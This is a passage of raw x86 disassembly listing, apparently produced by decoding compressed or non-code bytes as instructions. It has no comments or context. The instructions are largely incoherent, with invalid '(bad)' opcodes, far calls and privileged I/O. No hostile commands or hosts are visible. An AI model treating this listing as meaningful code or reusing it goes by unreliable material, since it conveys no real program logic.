  4184d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184d9:	call   0x190b:0xf149bdef
  4184e0:	stos   DWORD PTR es:[edi],eax
  4184e1:	pop    ebp
  4184e2:	cmp    BYTE PTR [eax-0x5e],ch
  4184e5:	xchg   DWORD PTR [edi+0x28],edi
  4184e8:	cmp    DWORD PTR [edx+eax*8],0x4c
  4184ec:	ret    0xdc1
  4184ef:	loopne 0x418528
  4184f1:	repnz xchg ecx,eax
  4184f3:	je     0x4184f6
  4184f5:	mov    ds:0xcee719e4,eax
  4184fa:	pop    edi
  4184fb:	mov    ebx,0xbf8172f4
  418500:	cli    
  418501:	int    0x9b
  418503:	aas    
  418504:	jb     0x4184de
  418506:	icebp  
  418507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418508:	or     DWORD PTR [ecx+eiz*8+0x4c],eax
  41850c:	lods   eax,DWORD PTR ds:[esi]
  41850d:	cmp    BYTE PTR [esi-0x5b],bh
  418510:	push   edi
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418581:	dec    esp
  418582:	sub    DWORD PTR [ecx+0x101c7],ebp
  418588:	add    eax,0x8c000001
  41858d:	xor    dh,bh
  41858f:	call   0x8fbc:0x511f2984
  418596:	(bad)  
  418597:	loopne 0x418593
  418599:	mov    ebx,0x11f1fe64
  41859e:	js     0x4185a9
  4185a0:	icebp  
  4185a1:	xor    al,BYTE PTR [edx]
  4185a3:	mov    al,ds:0x6a3aa498
  4185a8:	push   edx
  4185a9:	and    eax,0x71f773c
  4185ae:	cmp    ebx,DWORD PTR [esi]
  4185b0:	or     BYTE PTR [ecx],dl
  4185b2:	out    dx,al
  4185b3:	in     eax,dx
  4185b4:	test   al,0xf2
  4185b6:	fwait
  4185b7:	inc    esi
  4185b8:	jmp    0x4185cc
  4185ba:	push   ebx
  4185bb:	loop   0x41857e
  4185bd:	jmp    0x4185d6
  4185bf:	add    al,0xac
  4185c1:	ret    
  4185c2:	mov    eax,ds:0x4a58e908
  4185c7:	sub    dh,dl
  4185c9:	fldenv [ebx+eiz*8]
  4185cc:	stc    
  4185cd:	jae    0x41861a
  4185cf:	ret    0x9606
  4185d2:	ins    DWORD PTR es:[edi],dx
  4185d3:	inc    esi
  4185d4:	mov    ebx,0x5c25580b
  4185d9:	popa   
  4185da:	pusha  
  4185db:	mov    ds:0x84694b58,eax
  4185e0:	outs   dx,DWORD PTR ds:[esi]
  4185e1:	adc    al,0x84
  4185e3:	cld    
  4185e4:	or     al,BYTE PTR [esi-0x63]
  4185e7:	sbb    DWORD PTR [edx+0xf],0x8dde5374
  4185ee:	sub    ebp,DWORD PTR [edx]
  4185f0:	sub    bl,BYTE PTR [edi+0x7a]
  4185f3:	jnp    0x418596
  4185f5:	(bad)  
  4185f6:	test   BYTE PTR [edi],0xa2
  4185f9:	jns    0x4185da
  4185fb:	sbb    esi,DWORD PTR [esp+eax*4+0x29182582]
  418602:	icebp  
  418603:	enter  0xfd4b,0x69
  418607:	es jb  0x418669
  41860a:	dec    eax
  41860b:	(bad)
  41860f:	xor    al,0x4b
  418611:	mov    ecx,0xfff7e903
  418616:	mov    ds:0xbe77b8d3,eax
  41861b:	push   ebp
  41861c:	push   esi
  41861d:	pop    esp
  41861e:	dec    edx
  41861f:	and    al,BYTE PTR es:[esp+edi*2+0x1e8d3033]
  418627:	aam    0x94
  418629:	shl    DWORD PTR [edx+0x64336470],0x5
  418630:	pop    ebp
  418631:	add    BYTE PTR [eax-0x7c],ah
  418634:	xchg   ebx,eax
  418635:	jne    0x418643
  418637:	call   0xac3a0964
  41863c:	pop    esi
  41863d:	jns    0x418662
  41863f:	imul   eax,edx,0x7a
  418642:	push   ss
  418643:	mov    esi,0xf7942fd7
  418648:	dec    edi
  418649:	pop    ss
  41864a:	ins    BYTE PTR es:[edi],dx
  41864b:	cmc    
  41864c:	dec    ecx
  41864d:	sub    eax,0xb617f75f
  418652:	stos   DWORD PTR es:[edi],eax
  418653:	inc    ebx
  418654:	sbb    bl,0xa1
  418657:	pop    edx
  418658:	(bad)  
  418659:	mov    ebp,0x776ba997
  41865e:	hlt    
  41865f:	adc    eax,0xa47e0360
  418664:	mov    ds:0x21110550,al
  418669:	cld    
  41866a:	cmp    BYTE PTR cs:[edx],ah
  41866d:	test   DWORD PTR [ecx+edx*2+0x6f],ebx
  418671:	lods   al,BYTE PTR ds:[esi]
  418672:	clc    
  418673:	mov    al,0xd2
  418675:	aam    0xe7
  418677:	sbb    al,0xaa
  418679:	dec    ecx
  41867a:	dec    cx
  41867c:	pop    es
  41867d:	mov    ecx,esi
  41867f:	xchg   ebp,eax
  418680:	mov    cl,dh
  418682:	ffree  st(1)
  418684:	jo     0x4186f5
  418686:	iret   
  418687:	in     eax,0x6d
  418689:	cmc    
  41868a:	pop    esp
  41868b:	retf   
  41868c:	mov    DWORD PTR [esi+ebx*4+0xd9c4],eax
	...
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	scas   al,BYTE PTR es:[edi]
  418701:	icebp  
  418702:	mov    bl,BYTE PTR [ebp-0x34]
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR ds:0xe6000001,al
  41870d:	aaa    
  41870e:	test   al,ah
  418710:	xchg   esi,eax
  418711:	xchg   esp,eax
  418712:	and    eax,DWORD PTR [eax]
  418714:	dec    ebx
  418715:	sbb    ecx,ebx
  418717:	mov    esi,0x49598de
  41871c:	mov    ebx,0x986750e4
  418721:	fs add al,0xe0
  418724:	xor    al,0x2a
  418726:	mov    al,0xc
  418728:	cmp    bl,BYTE PTR [edx+0x6b9bac42]
  41872e:	ja     0x4186c0
  418730:	pop    ebx
  418731:	pop    ecx
  418732:	jmp    0xf6b4:0xbf09193a
  418739:	shl    DWORD PTR [edx+edx*4+0x4ad38265],cl
  418740:	xor    BYTE PTR [esi-0x6b4af9f4],ch
  418746:	rcl    DWORD PTR [ecx+eax*1-0x2a],0x84
  41874b:	jmp    0xda2735b9
  418750:	adc    BYTE PTR [eax+0x5d1368d9],ah
  418756:	cld    
  418757:	adc    cl,al
  418759:	into   
  41875a:	aad    0xd8
  41875c:	into   
  41875d:	std    
  41875e:	std    
  41875f:	out    0xd2,eax
  418761:	ret    0xce86
  418764:	and    BYTE PTR [ecx+0x67],ch
  418767:	mov    esp,0x8619e6c1
  41876c:	in     eax,dx
  41876d:	clc    
  41876e:	ficom  DWORD PTR [esi-0x3d]
  418771:	ret    0x3796
  418774:	fs ins BYTE PTR es:[edi],dx
  418776:	push   ebx
  418777:	cmp    al,0xf4
  418779:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41877b:	cmp    bh,ch
  41877d:	lds    esp,FWORD PTR [edi]
  41877f:	mov    edi,0xd0be16e5
  418784:	and    BYTE PTR [eax-0x76d7100],bl
  41878a:	icebp  
  41878b:	mov    dh,0x43
  41878d:	mov    BYTE PTR [edx+0x212b36ba],dh
  418793:	aad    0xf9
  418795:	cdq    
  418796:	ja     0x418729
  418798:	dec    edi
  418799:	mov    cl,0x67
  41879b:	sbb    eax,0xe512d00f
  4187a0:	pop    esi
  4187a1:	jne    0x41881b
  4187a3:	enter  0x92c1,0xca
  4187a7:	cld    
  4187a8:	aaa    
  4187a9:	pop    ss
  4187aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ab:	adc    BYTE PTR [edi-0x6b0d1274],al
  4187b1:	mov    al,0x6b
  4187b3:	or     BYTE PTR [ecx-0x2f1e6d5],0xc7
  4187ba:	xchg   ebx,eax
  4187bb:	jecxz  0x418836
  4187bd:	sahf   
  4187be:	cmp    al,0xa5
  4187c0:	add    dl,dh
  4187c2:	and    cl,BYTE PTR [edx+esi*1+0x7a]
  4187c6:	jne    0x418798
  4187c8:	lahf   
  4187c9:	js     0x41883a
  4187cb:	xlat   BYTE PTR ds:[ebx]
  4187cc:	loopne 0x418834
  4187ce:	sub    ebp,DWORD PTR [ecx-0x778dacde]
  4187d4:	stos   BYTE PTR es:[edi],al
  4187d5:	inc    ecx
  4187d6:	(bad)  
  4187d7:	dec    eax
  4187d8:	out    dx,eax
  4187d9:	push   esp
  4187da:	push   ebp
  4187db:	sti    
  4187dc:	aam    0xec
  4187de:	inc    ecx
  4187df:	inc    edi
  4187e0:	nop
  4187e1:	or     al,0x57
  4187e3:	or     BYTE PTR [edx+ebx*4+0x53],ch
  4187e7:	scas   al,BYTE PTR es:[edi]
  4187e8:	and    al,0xe4
  4187ea:	jp     0x4187fb
  4187ec:	sbb    edi,edx
  4187ee:	repz mov al,ds:0xc3691f6d
  4187f4:	aam    0x4a
  4187f6:	add    esp,ecx
  4187f8:	cmp    ch,cl
  4187fa:	cdq    
  4187fb:	outs   dx,BYTE PTR ds:[esi]
  4187fc:	sub    edx,DWORD PTR [esi+eiz*1-0x62cf79cd]
  418803:	jp     0x41887d
  418805:	pusha  
  418806:	mov    ds:0x11312e32,eax
  41880b:	sub    esp,DWORD PTR [edx+0x60]
  41880e:	dec    ecx
  41880f:	or     ebx,edi
	...
  418871:	add    BYTE PTR [eax],al
  418873:	add    BYTE PTR [eax+ecx*8-0x80bcc9],dl
  41887a:	hlt    
  41887b:	fbld   TBYTE PTR [esi+0x189c3acd]
  418881:	vhsubps ymm2,ymm6,ymm1
  418885:	add    eax,DWORD PTR [ecx]
  418887:	add    BYTE PTR ds:0x4f000001,al
  41888d:	cmc    
  41888e:	add    DWORD PTR [eax],ecx
  418890:	adc    ebx,DWORD PTR [edi]
  418892:	and    BYTE PTR [ebx-0x2b],bl
  418895:	and    al,0xd7
  418897:	cmc    
  418898:	pop    esp
  418899:	js     0x4188dd
  41889b:	push   ds
  41889c:	add    al,0x7f
  41889e:	inc    ebx
  41889f:	push   ebx
  4188a0:	or     cl,BYTE PTR [ebx-0x587dae]
  4188a6:	fild   WORD PTR [ebp-0x257a86ee]
  4188ac:	mov    ?,WORD PTR [eax]
  4188ae:	push   esp
  4188af:	cmp    eax,0x52cbd337
  4188b4:	inc    ecx
  4188b5:	jae    0x418869
  4188b7:	ins    DWORD PTR es:[edi],dx
  4188b8:	adc    eax,0x7d988a36
  4188be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188bf:	cmp    bl,BYTE PTR [eax+0x66]
  4188c2:	mov    al,ds:0x3307cb3
  4188c7:	or     eax,0xffffffce
  4188ca:	sbb    DWORD PTR [edi],esi
  4188cc:	aaa    
  4188cd:	inc    esp
  4188ce:	xchg   edi,eax
  4188cf:	nop
  4188d0:	push   es
  4188d1:	shl    BYTE PTR [edx],1
  4188d3:	cld    
  4188d4:	mov    bh,0x21
  4188d6:	cmp    BYTE PTR [edx+0xa],dl
  4188d9:	arpl   WORD PTR [edi],si
  4188db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188dc:	and    BYTE PTR fs:[edi],ah
  4188df:	pop    edi
  4188e0:	ret    
  4188e1:	test   ebp,ebp
  4188e3:	rol    DWORD PTR [ebp+edx*8-0xa],cl
  4188e7:	jecxz  0x4188ac
  4188e9:	and    DWORD PTR [ebp-0x1a],ebx
  4188ec:	dec    esp
  4188ed:	adc    ebp,esp
  4188ef:	xchg   ah,cl
  4188f1:	jb     0x418899
  4188f3:	hlt    
  4188f4:	cmp    al,0x7c
  4188f6:	addr16 jge 0x41891b
  4188f9:	xchg   ebp,eax
  4188fa:	jb     0x4188c3
  4188fc:	mov    cl,0x4f
  4188fe:	test   DWORD PTR [esi],eax
  418900:	adc    ebx,DWORD PTR [ebp+0x8]
  418903:	test   eax,0x8b9fed3c
  418908:	pop    edx
  418909:	add    eax,DWORD PTR [eax-0x6d1a9bb1]
  41890f:	mov    al,ds:0x19650138
  418914:	xlat   BYTE PTR ds:[ebx]
  418915:	mov    eax,0x5dd30ac2
  41891a:	cwde   
  41891b:	sub    eax,0x5fc558c0
  418920:	dec    esp
  418921:	dec    ecx
  418922:	push   cs
  418923:	js     0x4189a4
  418925:	ins    BYTE PTR es:[edi],dx
  418926:	dec    esi
  418927:	dec    eax
  418928:	(bad)  
  418929:	fucomip st,st(7)
  41892b:	mov    edx,0x2d4a1914
  418930:	sub    DWORD PTR [ebx+ecx*2-0x7d],edx
  418934:	popa   
  418935:	nop
  418936:	cmp    dh,BYTE PTR [esi]
  418938:	mov    ecx,DWORD PTR [ecx-0x28]
  41893b:	shr    BYTE PTR ds:[ebp-0x4406130b],1
  418942:	or     edx,DWORD PTR [ecx]
  418944:	mov    cl,0x67
  418946:	cmp    ch,BYTE PTR [ebx-0x67]
  418949:	xor    dl,BYTE PTR [ebp+eiz*8-0x754dac3f]
  418950:	inc    DWORD PTR [esi+0x3]
  418953:	gs jns 0x4188f9
  418956:	fcos   
  418958:	shl    DWORD PTR [ebp*4-0x49cd61b2],0x81
  418960:	jno    0x418907
  418962:	jmp    0x41897f
  418964:	fst    QWORD PTR [ebx]
  418966:	push   esp
  418967:	dec    ecx
  418968:	or     al,0xe0
  41896a:	add    esi,DWORD PTR [edi+edi*1-0x16c80e70]
  418971:	jb     0x4189e7
  418973:	mov    dl,0xea
  418975:	retf   0xec80
  418978:	mov    dl,0x4c
  41897a:	ss mov esi,0xdd1950df
  418980:	mov    dl,0x9c
  418982:	test   al,0x3b
  418984:	dec    esp
  418985:	push   ecx
  418986:	adc    DWORD PTR [ecx+0x6860bc57],edx
  41898c:	loop   0x418984
  41898e:	sbb    eax,0x7d8f
	...
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xf2c06069
  418a03:	add    dh,dl
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR ds:0xca000001,al
  418a0d:	fwait
  418a0e:	in     al,dx
  418a0f:	stos   BYTE PTR es:[edi],al
  418a10:	mov    BYTE PTR [edi-0x3b],ah
  418a13:	adc    dl,al
  418a15:	lds    ebx,FWORD PTR [eax+ecx*4-0x77]
  418a19:	test   BYTE PTR [ebx-0x1f982a44],dh
  418a1f:	adc    DWORD PTR [esp+ebp*1],ecx
  418a22:	fdivr  QWORD PTR [edx-0xa]
  418a25:	mov    bl,0x3d
  418a27:	dec    ebp
  418a28:	jmp    0x418a11
  418a2a:	aas    
  418a2b:	mov    bl,0xdd
  418a2d:	cld    
  418a2e:	(bad)  
  418a2f:	(bad)  
  418a30:	mov    ch,0x20
  418a32:	xchg   edx,eax
  418a33:	in     eax,dx
  418a34:	mov    eax,ds:0xadc76ac2
  418a39:	dec    ecx
  418a3a:	inc    esi
  418a3b:	retf   0x8256
  418a3e:	sbb    al,0xc3
  418a40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a42:	xchg   DWORD PTR [eax+ecx*8-0xaec52e5],ebp
  418a49:	js     0x4189e1
  418a4b:	inc    esi
  418a4c:	mov    ch,al
  418a4e:	jae    0x418a52
  418a50:	pop    ebp
  418a51:	add    al,0xfe
  418a53:	xchg   ebp,eax
  418a54:	pop    eax
  418a55:	push   esp
  418a56:	xchg   ebp,eax
  418a57:	mov    DWORD PTR [edx+0x7],esp
  418a5a:	aam    0x42
  418a5c:	loopne 0x418ac9
  418a5e:	cwde   
  418a5f:	outs   dx,BYTE PTR ds:[esi]
  418a60:	icebp  
  418a61:	fdivr  QWORD PTR [ecx]
  418a63:	icebp  
  418a64:	cmp    al,0x31
  418a66:	xchg   esi,eax
  418a67:	xchg   ecx,eax
  418a68:	jecxz  0x418a6d
  418a6a:	and    al,0x6f
  418a6c:	mov    dh,0x2e
  418a6e:	addr16 (bad) 
  418a70:	pop    edx
  418a71:	adc    BYTE PTR [edi-0x25],ah
  418a74:	mov    dh,0x30
  418a76:	or     eax,0x16212e0c
  418a7b:	icebp  
  418a7c:	gs push ecx
  418a7e:	stos   BYTE PTR es:[edi],al
  418a7f:	sbb    esi,DWORD PTR [ebx-0x43]
  418a82:	fsub   QWORD PTR [edi]
  418a84:	ins    BYTE PTR es:[edi],dx
  418a85:	in     al,0x29
  418a87:	cmp    BYTE PTR [esp+ebx*4-0x1d2ea2fd],al
  418a8e:	push   edi
  418a8f:	test   eax,0x1db33d69
  418a94:	loop   0x418a7d
  418a96:	fstp   TBYTE PTR [ebp+0x4e349160]
  418a9c:	pop    ebp
  418a9d:	mov    al,0xdc
  418a9f:	xchg   BYTE PTR [ebx-0x5ed3d733],bl
  418aa5:	ficom  DWORD PTR [ecx-0x78]
  418aa8:	shl    BYTE PTR [esi],1
  418aaa:	mov    eax,ds:0xa1e891ab
  418aaf:	mov    bl,0xc4
  418ab1:	icebp  
  418ab2:	stc    
  418ab3:	mov    ch,0x9d
  418ab5:	sub    esi,DWORD PTR [ebp-0x166fdcea]
  418abb:	push   ebp
  418abc:	mov    WORD PTR [edx+0x4e],cs
  418abf:	int3   
  418ac0:	lock cmc 
  418ac2:	sbb    dh,BYTE PTR [ebx+0x6495e40d]
  418ac8:	mov    esp,0xeb260fcc
  418acd:	lahf   
  418ace:	outs   dx,DWORD PTR ds:[esi]
  418acf:	xlat   BYTE PTR ds:[ebx]
  418ad0:	fld    QWORD PTR [eax]
  418ad2:	xchg   BYTE PTR [esi+0x6d35deb8],bh
  418ad8:	xchg   edi,eax
  418ad9:	cmp    eax,0xadd8511c
  418ade:	cmp    eax,0xc43b4a27
  418ae3:	xlat   BYTE PTR ds:[ebx]
  418ae4:	scas   al,BYTE PTR es:[edi]
  418ae5:	jl     0x418b08
  418ae7:	cwde   
  418ae8:	ja     0x418b3e
  418aea:	add    DWORD PTR [edi+ebx*4],esp
  418aed:	jno    0x418b6d
  418aef:	and    dh,BYTE PTR [ebp+0xb]
  418af2:	pop    edx
  418af3:	pop    esp
  418af4:	push   edi
  418af5:	cmp    al,BYTE PTR [bp-0x28e4]
  418afa:	mov    al,ds:0xc0bb139b
  418aff:	dec    edx
  418b00:	add    al,0xb7
  418b02:	in     eax,dx
  418b03:	aad    0xc5
  418b05:	stos   BYTE PTR es:[edi],al
  418b06:	pusha  
  418b07:	aaa    
  418b08:	jne    0x418aa7
  418b0a:	arpl   WORD PTR [bx+si],bp
  418b0d:	pop    ecx
  418b0e:	sub    al,0x5d
  418b10:	fwait
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0xd8
  418b81:	lds    edi,FWORD PTR [ecx+edi*1+0x105db]
  418b88:	add    eax,0x5c000001
  418b8d:	or     BYTE PTR [edi],0x67
  418b90:	inc    ebx
  418b91:	data16 lahf 
  418b93:	dec    esp
  418b94:	pushf  
  418b95:	inc    ebp
  418b96:	jns    0x418bf5
  418b98:	iret   
  418b99:	add    al,0xbc
  418b9b:	popf   
  418b9c:	mov    ecx,0x966b08a5
  418ba1:	jno    0x418bb3
  418ba3:	popa   
  418ba4:	(bad)  
  418ba5:	push   edx
  418ba6:	iret   
  418ba7:	lahf   
  418ba8:	popf   
  418ba9:	inc    edx
  418baa:	repnz aam 0x9d
  418bad:	mov    edx,0x17113f91
  418bb2:	pop    esp
  418bb3:	sbb    al,0xc5
  418bb5:	aam    0x86
  418bb7:	add    BYTE PTR [edi-0x3],ah
  418bba:	into   
  418bbb:	or     ebp,edx
  418bbd:	test   eax,0x5f9fe441
  418bc2:	or     eax,0x3c2b9c86
  418bc7:	sub    BYTE PTR [ebx],bl
  418bc9:	(bad)  
  418bca:	and    ch,al
  418bcc:	aam    0x87
  418bce:	js     0x418b8a
  418bd0:	leave  
  418bd1:	bound  esp,QWORD PTR [edx]
  418bd3:	sub    BYTE PTR [eax],dl
  418bd5:	out    dx,al
  418bd6:	jl     0x418b73
  418bd8:	sahf   
  418bd9:	mov    ch,0xaf
  418bdb:	xchg   esp,eax
  418bdc:	or     al,0xf
  418bde:	pop    esi
  418bdf:	mov    esi,0xad51471c
  418be4:	lock dec ebx
  418be6:	pop    esp
  418be7:	mov    ecx,0x7ea004b5
  418bec:	mov    ds:0x5fec2a5f,eax
  418bf1:	cmp    al,0x1b
  418bf3:	add    ecx,edi
  418bf5:	ret    0x4640
  418bf8:	jmp    DWORD PTR [edx+0x0]
  418bfb:	xchg   BYTE PTR [ebx],cl
  418bfd:	pushf  
  418bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bff:	and    bl,ch
  418c01:	xchg   ebp,eax
  418c02:	mov    ah,0x90
  418c04:	and    edi,0x657d50fe
  418c0a:	push   eax
  418c0b:	loope  0x418bad
  418c0d:	sub    eax,0xa6ccfe79
  418c12:	cs push ebx
  418c14:	and    al,0xaa
  418c16:	hlt    
  418c17:	xchg   esp,esp
  418c19:	mov    eax,0xba75628e
  418c1e:	(bad)  
  418c1f:	cmp    dh,BYTE PTR [edi+0x6f]
  418c22:	int    0xe4
  418c24:	or     ebp,DWORD PTR [ebx]
  418c26:	lods   al,BYTE PTR ds:[esi]
  418c27:	lahf   
  418c28:	push   edx
  418c29:	hlt    
  418c2a:	or     cl,BYTE PTR [esi-0x1a257be5]
  418c30:	pop    es
  418c31:	lods   eax,DWORD PTR ds:[esi]
  418c32:	gs jecxz 0x418c2b
  418c35:	fdiv   DWORD PTR [ecx]
  418c37:	push   esi
  418c38:	idiv   BYTE PTR [ebx-0x20a8a736]
  418c3e:	into   
  418c3f:	pop    esi
  418c40:	mul    bh
  418c42:	xchg   ebp,eax
  418c43:	pushfw 
  418c45:	lock (bad) 
  418c47:	mov    esi,0xed82ecbb
  418c4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c4d:	shl    BYTE PTR [esi-0x5dda73db],0x9a
  418c54:	call   0xe84a:0xf15bd2b8
  418c5b:	scas   al,BYTE PTR es:[edi]
  418c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c5d:	in     al,0xe8
  418c5f:	test   eax,0x9957904f
  418c64:	bound  ebx,QWORD PTR [edx-0x14]
  418c67:	jg     0x418ca8
  418c69:	jmp    0x3a22:0x2ed0441d
  418c70:	test   DWORD PTR [edx-0x68],esp
  418c73:	xchg   DWORD PTR [ecx+edx*1+0x1d52fe47],ebp
  418c7a:	push   edi
  418c7b:	and    al,0x68
  418c7d:	cmp    ecx,DWORD PTR [ecx-0x7c]
  418c80:	fsubr  QWORD PTR ds:0x1544c425
  418c86:	fwait
  418c87:	xor    DWORD PTR [ecx],esp
  418c89:	jp     0x418ccb
  418c8b:	pop    ebx
  418c8c:	push   ebp
  418c8d:	dec    eax
  418c8e:	imul   edx,DWORD PTR [ebx-0x60],0x0
	...
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	add    bl,bh
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcl    al,cl
  418d01:	mov    esi,0x6e0bd96
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    eax,0x1b000001
  418d0d:	aam    0x8
  418d0f:	jns    0x418d6a
  418d11:	sbb    DWORD PTR [edi],ebp
  418d13:	mov    esp,0x7ee457ac
  418d18:	push   cs
  418d19:	jge    0x418d3e
  418d1b:	pop    edi
  418d1c:	leave  
  418d1d:	sti    
  418d1e:	pusha  
  418d1f:	mov    ebx,ebp
  418d21:	mov    bl,0x52
  418d23:	and    bl,BYTE PTR [ebp+0x60]
  418d26:	fst    QWORD PTR [ecx+ecx*1]
  418d29:	dec    ecx
  418d2a:	mov    cl,0xdd
  418d2c:	mov    ah,bl
  418d2e:	push   eax
  418d2f:	mov    al,ds:0x3f3a5ba0
  418d34:	cdq    
  418d35:	popf   
  418d36:	adc    al,0xfd
  418d38:	xor    DWORD PTR [eax+ebx*2+0x56f241e3],ecx
  418d3f:	(bad)  
  418d40:	sbb    al,BYTE PTR [ebx]
  418d42:	lahf   
  418d43:	xchg   esp,eax
  418d44:	jnp    0x418d30
  418d46:	rol    dh,1
  418d48:	test   eax,0xc0f369c0
  418d4d:	paddsw mm6,QWORD PTR [ebp+eiz*2-0x65fc816]
  418d55:	mov    WORD PTR [esi],?
  418d57:	mov    ds:0xbbe99f6b,eax
  418d5c:	mov    ds:0xff168f61,eax
  418d61:	or     edx,DWORD PTR [eax]
  418d63:	das    
  418d64:	in     eax,dx
  418d65:	mov    ecx,DWORD PTR [edx+0x1b91d325]
  418d6b:	or     ebx,DWORD PTR [esi-0x5647aaa0]
  418d71:	jbe    0x418d80
  418d73:	push   edi
  418d74:	call   eax
  418d76:	push   cs
  418d77:	push   esi
  418d78:	cmp    DWORD PTR [ebx+ebp*1-0x16],esp
  418d7c:	inc    ecx
  418d7d:	inc    eax
  418d7e:	(bad)  
  418d7f:	or     ch,BYTE PTR [ebp+edx*8+0x1c810e9a]
  418d86:	mov    edi,0xe396d6ec
  418d8b:	push   ecx
  418d8c:	clc    
  418d8d:	pop    ebp
  418d8e:	adc    al,0x8b
  418d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d91:	cdq    
  418d92:	sub    BYTE PTR [edi-0x271d87d9],dh
  418d98:	fwait
  418d99:	add    BYTE PTR [edx+0x42],bl
  418d9c:	mov    ecx,0x585a618
  418da1:	stos   BYTE PTR es:[edi],al
  418da2:	dec    esp
  418da4:	test   al,0x40
  418da6:	inc    esi
  418da7:	sbb    al,0xf
  418da9:	lock sbb al,0xed
  418dac:	cli    
  418dad:	lahf   
  418dae:	pop    edi
  418daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418db0:	push   ss
  418db1:	mov    ds:0xb4fd3604,al
  418db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418db7:	in     eax,dx
  418db8:	inc    edx
  418db9:	dec    edi
  418dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dbb:	push   ebp
  418dbc:	add    eax,0x2f8f3518
  418dc1:	push   ds
  418dc2:	sbb    DWORD PTR [eax+0x5c],0x51
  418dc6:	mul    BYTE PTR [ebx-0x649ecd79]
  418dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dcd:	shl    edx,cl
  418dcf:	xchg   ebx,eax
  418dd0:	out    0xc,eax
  418dd2:	int3   
  418dd3:	in     al,0x82
  418dd5:	mov    dl,0xc7
  418dd7:	cs and eax,0xf5aef389
  418ddd:	gs pop ss
  418ddf:	mov    al,0xfc
  418de1:	pop    esp
  418de2:	jne    0x418d6d
  418de4:	lahf   
  418de5:	cs sbb eax,0x594e0939
  418deb:	cmp    bh,BYTE PTR [edi]
  418ded:	push   ds
  418dee:	mov    eax,0xae963a19
  418df3:	mov    ch,0x2a
  418df5:	(bad)  
  418df6:	adc    DWORD PTR [edx+eiz*2+0x14],esi
  418dfa:	mov    edi,0x8cd38e2a
  418dff:	push   ecx
  418e00:	sar    dl,0xcd
  418e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e04:	inc    edx
  418e05:	pop    esi
  418e06:	pop    edx
  418e07:	push   esp
  418e08:	push   esi
  418e09:	sbb    ebx,esi
  418e0b:	and    al,0x6b
  418e0d:	add    eax,0x9d4fc9
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x20]
  418e81:	stc    
  418e82:	iret   
  418e83:	aas    
  418e84:	in     eax,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    eax,0x22000001
  418e8d:	pop    esi
  418e8e:	push   ecx
  418e8f:	adc    eax,0x8f2d9084
  418e94:	inc    edi
  418e95:	mov    WORD PTR ds:0xa749a15e,gs
  418e9b:	repz loopne 0x418e50
  418e9e:	mov    ebp,0xe219e97
  418ea3:	inc    esp
  418ea4:	and    ebp,ebx
  418ea6:	imul   ecx,DWORD PTR [eax],0x221e5178
  418eac:	adc    al,0x65
  418eae:	scas   al,BYTE PTR es:[edi]
  418eaf:	out    dx,eax
  418eb0:	mov    dh,0x78
  418eb2:	imul   eax,DWORD PTR [edx+0x5],0xffffffed
  418eb6:	cmp    ch,BYTE PTR [esi+0x4fb60ad3]
  418ebc:	adc    BYTE PTR [eax-0x2a1f2220],dh
  418ec2:	cmp    eax,0x4aa0a917
  418ec7:	lea    esp,[ebp-0x76085208]
  418ecd:	fbstp  TBYTE PTR ds:0xa8894ab0
  418ed3:	(bad)  
  418ed4:	cmc    
  418ed5:	shl    DWORD PTR [esi],cl
  418ed7:	jmp    0x56d2bfa4
  418edc:	imul   edx,esp,0x972512b5
  418ee2:	pusha  
  418ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ee4:	push   es
  418ee5:	inc    edx
  418ee6:	sub    esi,DWORD PTR [ecx-0x57f4d4b]
  418eec:	outs   dx,DWORD PTR ds:[esi]
  418eed:	stc    
  418eee:	add    eax,0x72292a1a
  418ef3:	or     BYTE PTR [ebx+0x38],ch
  418ef6:	jecxz  0x418f75
  418ef8:	ds mov al,0xb3
  418efb:	jecxz  0x418f01
  418efd:	sbb    BYTE PTR [edx-0x78e0bbd5],dl
  418f03:	cdq    
  418f04:	(bad)  
  418f05:	jbe    0x418f79
